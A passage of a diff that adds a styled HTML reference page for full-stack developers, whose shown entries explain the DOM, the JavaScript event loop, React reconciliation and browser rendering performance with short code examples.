@@ -1,0 +1,1626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Full Stack Dev — Deep Reference</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,400&family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,700;0,9..144,900;1,9..144,400&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink: #0f0e0b;
+  --paper: #f5f2eb;
+  --cream: #ede9e0;
+  --warm: #e8e2d5;
+  --accent: #c8410a;
+  --accent2: #1a5c8a;
+  --accent3: #2a7a3b;
+  --gold: #b8860b;
+  --muted: #7a7468;
+  --border: #d4cfc6;
+  --code-bg: #1c1a17;
+  --code-fg: #e8e2d5;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--paper);
+  color: var(--ink);
+  font-family: 'Fraunces', Georgia, serif;
+  line-height: 1.6;
+  min-height: 100vh;
+}
+
+/* ── Masthead ───────────────────────────────────────── */
+.masthead {
+  background: var(--ink);
+  color: var(--paper);
+  padding: 64px 48px 48px;
+  position: relative;
+  overflow: hidden;
+}
+
+.masthead::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background:
+    repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(255,255,255,0.04) 39px, rgba(255,255,255,0.04) 40px),
+    repeating-linear-gradient(90deg, transparent, transparent 39px, rgba(255,255,255,0.04) 39px, rgba(255,255,255,0.04) 40px);
+  pointer-events: none;
+}
+
+.masthead-inner {
+  position: relative;
+  max-width: 1280px;
+  margin: 0 auto;
+}
+
+.eyebrow {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.25em;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 20px;
+}
+
+.masthead h1 {
+  font-size: clamp(48px, 8vw, 96px);
+  font-weight: 900;
+  line-height: 0.88;
+  letter-spacing: -0.03em;
+  margin-bottom: 28px;
+}
+
+.masthead h1 em {
+  font-style: italic;
+  font-weight: 300;
+  color: #aaa49a;
+}
+
+.masthead-desc {
+  font-size: 17px;
+  color: #aaa49a;
+  max-width: 600px;
+  line-height: 1.7;
+  font-style: italic;
+  font-weight: 300;
+  margin-bottom: 40px;
+}
+
+.masthead-stats {
+  display: flex;
+  gap: 40px;
+  flex-wrap: wrap;
+}
+
+.mstat {
+  border-left: 2px solid var(--accent);
+  padding-left: 14px;
+}
+
+.mstat-n {
+  font-size: 32px;
+  font-weight: 900;
+  color: var(--paper);
+  display: block;
+  line-height: 1;
+}
+
+.mstat-l {
+  font-family: 'DM Mono', monospace;
+  font-size: 10px;
+  color: #666;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+}
+
+/* ── Navigation ─────────────────────────────────────── */
+nav.main-nav {
+  background: var(--ink);
+  border-top: 1px solid #2a2820;
+  position: sticky;
+  top: 0;
+  z-index: 200;
+  display: flex;
+  overflow-x: auto;
+  scrollbar-width: none;
+  padding: 0 48px;
+  gap: 0;
+}
+
+nav.main-nav::-webkit-scrollbar { display: none; }
+
+.ntab {
+  flex-shrink: 0;
+  padding: 14px 22px;
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: #555;
+  cursor: pointer;
+  border: none;
+  background: none;
+  border-bottom: 2px solid transparent;
+  transition: all 0.2s;
+  white-space: nowrap;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.ntab:hover { color: var(--paper); }
+.ntab.active { color: var(--paper); border-bottom-color: var(--accent); }
+
+.ntab-num {
+  font-size: 9px;
+  background: #222;
+  color: #555;
+  padding: 2px 5px;
+  border-radius: 3px;
+}
+
+.ntab.active .ntab-num { background: var(--accent); color: #fff; }
+
+/* ── Layout ─────────────────────────────────────────── */
+.layout {
+  max-width: 1280px;
+  margin: 0 auto;
+  padding: 0 48px 100px;
+  display: flex;
+  gap: 40px;
+  align-items: flex-start;
+}
+
+/* Sidebar TOC */
+.sidebar {
+  width: 220px;
+  flex-shrink: 0;
+  position: sticky;
+  top: 56px;
+  padding-top: 48px;
+  max-height: calc(100vh - 80px);
+  overflow-y: auto;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+
+.sidebar-label {
+  font-family: 'DM Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 12px;
+}
+
+.toc-item {
+  display: block;
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  padding: 5px 0 5px 12px;
+  border-left: 2px solid var(--border);
+  text-decoration: none;
+  transition: all 0.15s;
+  cursor: pointer;
+  margin-bottom: 2px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.toc-item:hover { color: var(--ink); border-left-color: var(--accent); }
+.toc-item.active-toc { color: var(--accent); border-left-color: var(--accent); }
+
+/* Content area */
+.content {
+  flex: 1;
+  min-width: 0;
+  padding-top: 48px;
+}
+
+/* Section */
+.section { display: none; }
+.section.active { display: block; animation: slideIn 0.3s ease; }
+
+@keyframes slideIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.section-heading {
+  display: flex;
+  align-items: baseline;
+  gap: 16px;
+  margin-bottom: 48px;
+  padding-bottom: 20px;
+  border-bottom: 2px solid var(--ink);
+}
+
+.section-heading h2 {
+  font-size: 42px;
+  font-weight: 900;
+  letter-spacing: -0.02em;
+  line-height: 1;
+}
+
+.section-heading .sh-sub {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  font-style: normal;
+}
+
+/* Search */
+.search-wrap {
+  margin-bottom: 36px;
+  position: relative;
+}
+
+.search-wrap input {
+  width: 100%;
+  background: var(--cream);
+  border: 1px solid var(--border);
+  border-radius: 0;
+  padding: 12px 44px 12px 16px;
+  font-family: 'DM Mono', monospace;
+  font-size: 13px;
+  color: var(--ink);
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.search-wrap input:focus { border-color: var(--ink); }
+.search-wrap input::placeholder { color: var(--muted); }
+
+.search-icon {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--muted);
+  font-size: 14px;
+  pointer-events: none;
+}
+
+/* ── Concept Cards ──────────────────────────────────── */
+.concept {
+  background: white;
+  border: 1px solid var(--border);
+  border-left: 4px solid var(--accent);
+  margin-bottom: 28px;
+  transition: box-shadow 0.2s;
+  scroll-margin-top: 80px;
+}
+
+.concept:hover { box-shadow: 4px 4px 0 var(--border); }
+
+.concept-header {
+  padding: 24px 28px;
+  cursor: pointer;
+  display: flex;
+  align-items: flex-start;
+  gap: 20px;
+  user-select: none;
+}
+
+.concept-meta {
+  flex: 1;
+  min-width: 0;
+}
+
+.concept-title-row {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  flex-wrap: wrap;
+  margin-bottom: 6px;
+}
+
+.concept-title {
+  font-size: 22px;
+  font-weight: 700;
+  letter-spacing: -0.01em;
+  line-height: 1.2;
+}
+
+.concept-badge {
+  font-family: 'DM Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  padding: 3px 8px;
+  border: 1px solid;
+  border-radius: 2px;
+  flex-shrink: 0;
+}
+
+.concept-tagline {
+  font-size: 15px;
+  color: var(--muted);
+  font-style: italic;
+  font-weight: 300;
+  line-height: 1.5;
+}
+
+.concept-toggle {
+  width: 28px;
+  height: 28px;
+  border: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'DM Mono', monospace;
+  font-size: 14px;
+  color: var(--muted);
+  flex-shrink: 0;
+  transition: all 0.2s;
+  margin-top: 2px;
+}
+
+.concept.open .concept-toggle { background: var(--ink); color: var(--paper); border-color: var(--ink); }
+
+/* Concept body */
+.concept-body {
+  display: none;
+  border-top: 1px solid var(--border);
+}
+
+.concept.open .concept-body { display: block; }
+
+.concept-body-inner {
+  padding: 32px 28px;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 32px;
+}
+
+@media (max-width: 900px) {
+  .concept-body-inner { grid-template-columns: 1fr; }
+  .layout { flex-direction: column; }
+  .sidebar { width: 100%; position: static; max-height: none; }
+  .layout { padding: 0 20px 60px; }
+  nav.main-nav { padding: 0 16px; }
+  .masthead { padding: 40px 20px 32px; }
+}
+
+.col-label {
+  font-family: 'DM Mono', monospace;
+  font-size: 9px;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.col-label::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+/* Explanation */
+.explanation p {
+  font-size: 14.5px;
+  line-height: 1.85;
+  color: #2a2820;
+  margin-bottom: 14px;
+}
+
+.explanation p:last-child { margin-bottom: 0; }
+
+.explanation strong { font-weight: 700; color: var(--ink); }
+
+.explanation em { font-style: italic; }
+
+.explanation .highlight {
+  background: #fff3cd;
+  border-left: 3px solid var(--gold);
+  padding: 10px 14px;
+  margin: 12px 0;
+  font-size: 13.5px;
+  line-height: 1.7;
+}
+
+.explanation .warning {
+  background: #fff0ed;
+  border-left: 3px solid var(--accent);
+  padding: 10px 14px;
+  margin: 12px 0;
+  font-size: 13.5px;
+  line-height: 1.7;
+}
+
+/* Use cases */
+.use-cases { }
+
+.use-case {
+  margin-bottom: 20px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid var(--border);
+}
+
+.use-case:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+
+.uc-where {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  font-weight: 500;
+  letter-spacing: 0.05em;
+  margin-bottom: 6px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.uc-where::before {
+  content: '→';
+  color: var(--accent);
+  font-size: 13px;
+}
+
+.uc-desc {
+  font-size: 13.5px;
+  color: #4a4640;
+  line-height: 1.7;
+}
+
+/* Code blocks */
+.code-section {
+  grid-column: 1 / -1;
+  border-top: 1px solid var(--border);
+  padding-top: 24px;
+  margin-top: 0;
+}
+
+.code-block {
+  background: var(--code-bg);
+  color: var(--code-fg);
+  font-family: 'DM Mono', monospace;
+  font-size: 12px;
+  line-height: 1.75;
+  padding: 20px 24px;
+  overflow-x: auto;
+  white-space: pre;
+  border-radius: 0;
+  margin-top: 8px;
+}
+
+.code-block .kw { color: #f97583; }
+.code-block .str { color: #9ecbff; }
+.code-block .cm { color: #555; font-style: italic; }
+.code-block .fn { color: #79b8ff; }
+.code-block .num { color: #ffab70; }
+.code-block .var { color: #e1e4e8; }
+.code-block .op { color: #f97583; }
+
+/* Tags row */
+.tags-row {
+  padding: 14px 28px;
+  border-top: 1px solid var(--border);
+  background: var(--cream);
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  align-items: center;
+}
+
+.tag {
+  font-family: 'DM Mono', monospace;
+  font-size: 10px;
+  padding: 3px 8px;
+  background: white;
+  border: 1px solid var(--border);
+  color: var(--muted);
+}
+
+/* Color variants */
+.v-red { border-left-color: var(--accent); }
+.v-blue { border-left-color: var(--accent2); }
+.v-green { border-left-color: var(--accent3); }
+.v-gold { border-left-color: var(--gold); }
+
+.badge-red { color: var(--accent); border-color: var(--accent); }
+.badge-blue { color: var(--accent2); border-color: var(--accent2); }
+.badge-green { color: var(--accent3); border-color: var(--accent3); }
+.badge-gold { color: var(--gold); border-color: var(--gold); }
+
+/* Empty state */
+.empty-state {
+  text-align: center;
+  padding: 80px 20px;
+  color: var(--muted);
+  font-style: italic;
+}
+
+.empty-state .big { font-size: 48px; margin-bottom: 16px; }
+
+/* Progress bar at top of page while searching */
+.result-count {
+  font-family: 'DM Mono', monospace;
+  font-size: 11px;
+  color: var(--muted);
+  margin-bottom: 20px;
+}
+</style>
+</head>
+<body>
+
+<div class="masthead">
+  <div class="masthead-inner">
+    <div class="eyebrow">// Full Stack Developer — Deep Reference</div>
+    <h1>The Complete<br><em>Knowledge</em><br>Compendium</h1>
+    <p class="masthead-desc">Deeply detailed explanations with real-world, practical use cases for every concept across the full stack — from pixels to production infrastructure.</p>
+    <div class="masthead-stats">
+      <div class="mstat"><span class="mstat-n" id="total-count">0</span><span class="mstat-l">Concepts</span></div>
+      <div class="mstat"><span class="mstat-n">8</span><span class="mstat-l">Domains</span></div>
+      <div class="mstat"><span class="mstat-n">Deep</span><span class="mstat-l">Detail Level</span></div>
+    </div>
+  </div>
+</div>
+
+<nav class="main-nav" id="main-nav">
+  <button class="ntab active" data-sec="frontend">Frontend <span class="ntab-num" id="n-frontend">0</span></button>
+  <button class="ntab" data-sec="backend">Backend <span class="ntab-num" id="n-backend">0</span></button>
+  <button class="ntab" data-sec="devops">DevOps <span class="ntab-num" id="n-devops">0</span></button>
+  <button class="ntab" data-sec="security">Security <span class="ntab-num" id="n-security">0</span></button>
+  <button class="ntab" data-sec="databases">Databases <span class="ntab-num" id="n-databases">0</span></button>
+  <button class="ntab" data-sec="cloud">Cloud <span class="ntab-num" id="n-cloud">0</span></button>
+  <button class="ntab" data-sec="systems">Systems <span class="ntab-num" id="n-systems">0</span></button>
+  <button class="ntab" data-sec="networking">Networking <span class="ntab-num" id="n-networking">0</span></button>
+</nav>
+
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-label">In this section</div>
+    <div id="toc"></div>
+  </aside>
+  <div class="content" id="content-area">
+
+    <div class="section active" id="frontend">
+      <div class="section-heading"><h2>Frontend</h2><span class="sh-sub">Browser · UI · Rendering · State · Performance</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search frontend..." oninput="doSearch(this,'frontend')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-frontend"></div>
+      <div id="frontend-list"></div>
+    </div>
+
+    <div class="section" id="backend">
+      <div class="section-heading"><h2>Backend</h2><span class="sh-sub">APIs · Servers · Architecture · Data Flow</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search backend..." oninput="doSearch(this,'backend')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-backend"></div>
+      <div id="backend-list"></div>
+    </div>
+
+    <div class="section" id="devops">
+      <div class="section-heading"><h2>DevOps</h2><span class="sh-sub">CI/CD · Containers · Orchestration · Pipelines</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search devops..." oninput="doSearch(this,'devops')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-devops"></div>
+      <div id="devops-list"></div>
+    </div>
+
+    <div class="section" id="security">
+      <div class="section-heading"><h2>Security</h2><span class="sh-sub">Auth · Encryption · Vulnerabilities · Hardening</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search security..." oninput="doSearch(this,'security')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-security"></div>
+      <div id="security-list"></div>
+    </div>
+
+    <div class="section" id="databases">
+      <div class="section-heading"><h2>Databases</h2><span class="sh-sub">SQL · NoSQL · Indexing · Transactions · Replication</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search databases..." oninput="doSearch(this,'databases')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-databases"></div>
+      <div id="databases-list"></div>
+    </div>
+
+    <div class="section" id="cloud">
+      <div class="section-heading"><h2>Cloud</h2><span class="sh-sub">AWS · GCP · Azure · IaC · Serverless · Scaling</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search cloud..." oninput="doSearch(this,'cloud')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-cloud"></div>
+      <div id="cloud-list"></div>
+    </div>
+
+    <div class="section" id="systems">
+      <div class="section-heading"><h2>Systems</h2><span class="sh-sub">OS · Memory · Concurrency · Distributed Systems</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search systems..." oninput="doSearch(this,'systems')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-systems"></div>
+      <div id="systems-list"></div>
+    </div>
+
+    <div class="section" id="networking">
+      <div class="section-heading"><h2>Networking</h2><span class="sh-sub">TCP/IP · DNS · HTTP · Proxies · Protocols</span></div>
+      <div class="search-wrap"><input type="text" placeholder="Search networking..." oninput="doSearch(this,'networking')"><span class="search-icon">⌕</span></div>
+      <div class="result-count" id="rc-networking"></div>
+      <div id="networking-list"></div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════
+// DATA
+// ═══════════════════════════════════════════════════════════
+const DATA = {
+
+frontend: [
+  {
+    title: 'The DOM (Document Object Model)',
+    badge: 'Core API', color: 'red',
+    tagline: 'The live, in-memory tree of your webpage that JavaScript reads and writes.',
+    explanation: `<p>When a browser receives an HTML file over the network, its HTML parser reads the raw bytes and constructs a tree of objects in memory called the <strong>DOM (Document Object Model)</strong>. Every HTML tag becomes a <strong>node</strong> — the <code>&lt;html&gt;</code> element is the root, <code>&lt;body&gt;</code> is its child, and so on recursively down to text nodes and attribute nodes. This tree is a live, mutable representation of the page.</p>
+    <p>JavaScript interacts with the DOM through the <code>document</code> global object. APIs like <code>document.querySelector('.card')</code>, <code>element.appendChild(child)</code>, or <code>element.addEventListener('click', handler)</code> all operate on this tree. When you change the DOM — add a class, remove a node, change text — the browser reflects that change visually.</p>
+    <div class="highlight"><strong>Key insight:</strong> DOM mutations are expensive. Every time you touch layout-affecting properties (width, height, position), the browser must recalculate layout ("reflow") and repaint. Reading layout properties like <code>offsetHeight</code> immediately after a write forces a <em>synchronous layout</em> (also called "layout thrashing") — the browser must stop, compute layout, return the value, and then resume. This is one of the most common performance killers.</div>
+    <p>The browser's rendering pipeline is: <strong>Parse HTML → Build DOM → Parse CSS → Build CSSOM → Merge into Render Tree → Layout → Paint → Composite</strong>. DOM access during JS execution inserts into this pipeline. Batching reads and writes — doing all reads first, then all writes — avoids forced reflows.</p>
+    <div class="warning"><strong>Common mistake:</strong> Calling <code>el.style.width</code> in a loop that also reads <code>el.offsetWidth</code> forces a reflow on every iteration. Use techniques like <code>requestAnimationFrame</code> to schedule DOM writes during the browser's natural paint cycle.</div>`,
+    usecases: [
+      { where: 'Building interactive UI without a framework', desc: 'A vanilla JS todo-list app directly manipulates the DOM: querying the list element, creating <code>&lt;li&gt;</code> nodes with <code>document.createElement</code>, setting text content, and appending them. This is exactly what React/Vue abstract away.' },
+      { where: 'Browser extensions', desc: 'Extensions like ad blockers inject scripts that traverse the DOM tree searching for ad containers by class or attribute, then call <code>element.remove()</code>. Grammarly injects a shadow DOM overlay on editable elements to display suggestions.' },
+      { where: 'Drag & Drop implementations', desc: 'Event listeners on DOM nodes track <code>mousedown</code>, <code>mousemove</code>, <code>mouseup</code> to implement custom drag behavior. The element\'s position is updated via style mutations on each mouse move.' },
+      { where: 'Automated testing', desc: 'Playwright and Cypress both have a built-in DOM query engine. Tests call <code>page.locator(\'button[type="submit"]\')</code> which internally uses the DOM API to find and interact with elements.' },
+    ],
+    code: `<span class="cm">// ❌ Layout thrashing — forces reflow on each iteration</span>
+<span class="kw">for</span> (<span class="kw">let</span> i = <span class="num">0</span>; i < items.length; i++) {
+  items[i].style.height = items[i].offsetHeight + <span class="num">10</span> + <span class="str">'px'</span>; <span class="cm">// read then write</span>
+}
+
+<span class="cm">// ✅ Batch reads first, then writes</span>
+<span class="kw">const</span> heights = items.<span class="fn">map</span>(el => el.offsetHeight);  <span class="cm">// all reads</span>
+items.<span class="fn">forEach</span>((el, i) => {                              <span class="cm">// all writes</span>
+  el.style.height = heights[i] + <span class="num">10</span> + <span class="str">'px'</span>;
+});
+
+<span class="cm">// ✅ For animations, use rAF to sync with paint cycle</span>
+<span class="fn">requestAnimationFrame</span>(() => {
+  el.style.transform = <span class="str">\`translateX(\${x}px)\`</span>;
+});`,
+    tags: ['HTML', 'JavaScript', 'Browser', 'Reflow', 'Performance', 'Event Listeners']
+  },
+  {
+    title: 'Event Loop & Concurrency Model',
+    badge: 'Runtime', color: 'red',
+    tagline: 'How JavaScript handles async work in a single-threaded environment.',
+    explanation: `<p>JavaScript is <strong>single-threaded</strong> — there is only one call stack, meaning only one piece of code runs at a time. Yet we write async code that doesn't block the UI. How? The <strong>Event Loop</strong>.</p>
+    <p>The runtime has three key structures: (1) <strong>Call Stack</strong> — where function calls live. When a function is called, a frame is pushed; when it returns, it's popped. (2) <strong>Microtask Queue</strong> — holds callbacks from Promises (<code>.then</code>, <code>async/await</code>), <code>queueMicrotask</code>, and MutationObserver. (3) <strong>Macrotask Queue</strong> (Task Queue) — holds callbacks from <code>setTimeout</code>, <code>setInterval</code>, I/O callbacks, UI events.</p>
+    <p>The event loop algorithm: <strong>run the current task (call stack) to completion → drain the entire microtask queue → render if needed → take ONE macrotask from the queue → repeat</strong>. Microtasks are always fully drained before any macrotask runs. This is why Promises resolve before setTimeout even if the timeout is 0ms.</p>
+    <div class="highlight"><strong>async/await</strong> is syntactic sugar over Promises. <code>await</code> suspends the current async function and yields control back to the event loop. The continuation is scheduled as a microtask when the awaited Promise resolves. This is how you can write sequential-looking code that's actually non-blocking.</div>
+    <p><strong>Node.js</strong> extends this model with the libuv event loop, which has additional phases: timers → pending callbacks → idle/prepare → poll (wait for I/O) → check (setImmediate) → close callbacks. <code>process.nextTick</code> runs before the microtask queue in Node — a common source of confusion.</p>`,
+    usecases: [
+      { where: 'API data fetching in React', desc: 'When you call <code>fetch()</code> inside a useEffect, it returns a Promise. The network I/O happens off-thread (in the browser\'s networking layer). When the response arrives, its <code>.then</code> callback is queued as a microtask. React then re-renders with the new state — all without blocking the UI thread.' },
+      { where: 'Node.js web servers handling thousands of requests', desc: 'Express handles 10,000 concurrent connections with one thread because database queries and file I/O are non-blocking. Each request starts, awaits its DB query (which is handed off to libuv), and the event loop picks up the next request. When the DB responds, the callback continues. No thread per connection needed.' },
+      { where: 'Debouncing and throttling user input', desc: 'Search-as-you-type uses <code>setTimeout</code> debouncing: each keypress clears the previous timeout and sets a new 300ms one. Only after the user stops typing does the macrotask fire and the API call go out.' },
+      { where: 'Scheduling non-urgent work', desc: 'React\'s Concurrent Mode uses <code>MessageChannel</code> to schedule low-priority renders as macrotasks, letting higher-priority user interactions preempt ongoing renders.' },
+    ],
+    code: `<span class="cm">// Execution order demonstration</span>
+console.<span class="fn">log</span>(<span class="str">'[1] Synchronous'</span>);
+
+<span class="fn">setTimeout</span>(() => console.<span class="fn">log</span>(<span class="str">'[4] Macrotask'</span>), <span class="num">0</span>);
+
+Promise.<span class="fn">resolve</span>().<span class="fn">then</span>(() => console.<span class="fn">log</span>(<span class="str">'[3] Microtask'</span>));
+
+console.<span class="fn">log</span>(<span class="str">'[2] Synchronous'</span>);
+<span class="cm">// Output: [1], [2], [3], [4]</span>
+
+<span class="cm">// async/await: sequential code, non-blocking execution</span>
+<span class="kw">async function</span> <span class="fn">loadDashboard</span>() {
+  <span class="kw">const</span> user = <span class="kw">await</span> <span class="fn">fetchUser</span>();         <span class="cm">// suspends, yields to loop</span>
+  <span class="kw">const</span> posts = <span class="kw">await</span> <span class="fn">fetchPosts</span>(user.id); <span class="cm">// suspends again</span>
+  <span class="fn">render</span>({ user, posts });
+}
+
+<span class="cm">// Parallel fetch — don't await in sequence if independent</span>
+<span class="kw">const</span> [user, settings] = <span class="kw">await</span> Promise.<span class="fn">all</span>([
+  <span class="fn">fetchUser</span>(), <span class="fn">fetchSettings</span>()
+]);`,
+    tags: ['JavaScript', 'Async', 'Promises', 'Node.js', 'Event Loop', 'Microtasks']
+  },
+  {
+    title: 'React Reconciliation & Virtual DOM',
+    badge: 'Framework Internals', color: 'red',
+    tagline: 'How React decides what to update in the real DOM as efficiently as possible.',
+    explanation: `<p>React's central innovation is the <strong>Virtual DOM</strong> — a lightweight JavaScript object tree that mirrors the structure of the real DOM. When your component renders, it doesn't touch the real DOM directly. Instead, React builds a new virtual DOM tree and <strong>diffs</strong> it against the previous one. Only the differences are applied to the real DOM — a process called <strong>reconciliation</strong>.</p>
+    <p>The diffing algorithm makes assumptions to run in O(n) time instead of O(n³): (1) Elements of different types produce entirely different trees. (2) Developer-provided <code>key</code> props signal which list elements are stable across renders.</p>
+    <p><strong>React Fiber</strong> (React 16+) is a ground-up rewrite of the reconciler. It represents work as a linked list of "fiber" nodes that can be paused, resumed, and prioritized. This enables <strong>Concurrent Mode</strong> (React 18) — rendering can be interrupted by higher-priority work (like user input), preventing the UI from freezing during complex renders.</p>
+    <div class="highlight"><strong>Key mental model:</strong> Every state change triggers a re-render. React calls your component function again, gets a new element tree (VDOM), diffs it against the previous, and commits the minimal DOM changes. Components are just functions that return descriptions of UI — React handles the rest.</div>
+    <p><strong>Hooks</strong> fit into this model: <code>useState</code> stores state in a linked list attached to the fiber node. <code>useEffect</code> schedules side effects to run after the DOM is committed. <code>useMemo</code>/<code>useCallback</code> memoize values/functions across renders to prevent unnecessary recomputation.</p>
+    <div class="warning"><strong>The key prop is critical for lists.</strong> Without stable keys, React can't tell which item was added/removed/reordered — it may destroy and recreate DOM nodes unnecessarily, losing input focus and local state. Never use array index as key when the list can reorder.</div>`,
+    usecases: [
+      { where: 'Any React application', desc: 'Every time you call <code>setCount(count + 1)</code>, React schedules a re-render. The component function runs again, produces a new VDOM tree, React diffs it (finds only the text node changed), and updates just that text node in the real DOM. This is the core loop for every React app.' },
+      { where: 'Dynamic lists (feeds, tables, search results)', desc: 'Instagram\'s feed renders thousands of posts as virtual DOM. When new posts arrive, React\'s reconciler matches existing fiber nodes by key (post ID), only creating new nodes for new posts and reusing existing DOM nodes for unchanged ones.' },
+      { where: 'Concurrent features (React 18)', desc: 'When a user types in a search box while React is rendering 10,000 filtered results, Concurrent Mode lets React pause the expensive render, handle the keypress (high priority), then resume the list render. The UI never feels frozen.' },
+      { where: 'React DevTools Profiler', desc: 'React DevTools\' Profiler tab visualizes the reconciliation process — showing which components re-rendered, how long each took, and why they rendered (state change, context update, parent re-render). This is how you identify unnecessary renders and optimize with <code>React.memo</code>.' },
+    ],
+    code: `<span class="cm">// React re-renders the component function, diffs the result</span>
+<span class="kw">function</span> <span class="fn">Counter</span>() {
+  <span class="kw">const</span> [count, setCount] = <span class="fn">useState</span>(<span class="num">0</span>);
+  <span class="cm">// Each render: React calls this fn, gets new VDOM, diffs</span>
+  <span class="kw">return</span> &lt;button onClick={() => <span class="fn">setCount</span>(c => c + <span class="num">1</span>)}&gt;{count}&lt;/button&gt;;
+}
+
+<span class="cm">// Keys: stable IDs prevent unnecessary DOM reconstruction</span>
+posts.<span class="fn">map</span>(post => (
+  &lt;PostCard key={post.id} post={post} /&gt;  <span class="cm">// ✅ stable key</span>
+))
+
+<span class="cm">// Avoid re-renders: memoize expensive computations</span>
+<span class="kw">const</span> filtered = <span class="fn">useMemo</span>(
+  () => items.<span class="fn">filter</span>(i => i.active),
+  [items]   <span class="cm">// only recompute when items changes</span>
+);
+
+<span class="cm">// Concurrent: mark low-priority updates</span>
+<span class="kw">const</span> [isPending, startTransition] = <span class="fn">useTransition</span>();
+<span class="fn">startTransition</span>(() => <span class="fn">setSearchResults</span>(heavyFilter(query)));`,
+    tags: ['React', 'VDOM', 'Fiber', 'Hooks', 'Reconciliation', 'Performance', 'Concurrent Mode']
+  },
+  {
+    title: 'Critical Rendering Path & Web Performance',
+    badge: 'Performance', color: 'red',
+    tagline: 'The sequence of steps browsers take to display pixels — and how to optimize each one.',
+    explanation: `<p>The <strong>Critical Rendering Path (CRP)</strong> is the sequence of steps a browser must complete before it can display content: (1) Receive HTML bytes → (2) Parse HTML, build DOM → (3) Parse CSS, build CSSOM → (4) Combine into Render Tree → (5) Layout (compute geometry) → (6) Paint (rasterize to pixels) → (7) Composite (merge layers and display).</p>
+    <p><strong>Render-blocking resources</strong> halt step 2 or 3: CSS in <code>&lt;head&gt;</code> blocks rendering until fully parsed (browsers won't show a page with unstyled content). Synchronous <code>&lt;script&gt;</code> tags block HTML parsing because JS might call <code>document.write</code>. This is why you put scripts at the bottom of body or use <code>defer</code>/<code>async</code>.</p>
+    <p>Core Web Vitals measure real user experience: <strong>LCP (Largest Contentful Paint)</strong> — time until the largest visible element loads (target: &lt;2.5s). <strong>INP (Interaction to Next Paint)</strong> — responsiveness to clicks/taps (target: &lt;200ms). <strong>CLS (Cumulative Layout Shift)</strong> — visual stability, elements jumping around (target: &lt;0.1).</p>
+    <div class="highlight"><strong>Compositor-only properties</strong> (transform, opacity) skip layout and paint entirely — they're applied by the GPU compositor layer. This is why <code>transform: translateX()</code> animations are silky smooth at 60fps while animating <code>left</code> causes jank (triggers full layout).</div>
+    <p>Key optimization techniques: <strong>Preload</strong> key resources (<code>&lt;link rel="preload"&gt;</code>), <strong>inline critical CSS</strong> (above-the-fold styles in <code>&lt;style&gt;</code> tag), <strong>lazy load</strong> images below the fold (<code>loading="lazy"</code>), <strong>code-split</strong> JavaScript bundles, <strong>use HTTP/2</strong> for multiplexed resource delivery, <strong>serve from a CDN</strong> to reduce network RTT.</p>`,
+    usecases: [
+      { where: 'E-commerce product pages (LCP optimization)', desc: 'Amazon and Shopify ensure hero images have <code>&lt;link rel="preload"&gt;</code>, are served in WebP format, and have explicit width/height attributes to prevent CLS. Every 100ms of LCP improvement correlates directly with conversion rate increases.' },
+      { where: 'Single Page Apps (bundle optimization)', desc: 'A React app that ships a single 3MB JS bundle will have terrible LCP. Solutions: route-based code splitting (each route loads its own chunk), vendor chunk separation (React/ReactDOM cached separately), and tree-shaking to eliminate unused library code.' },
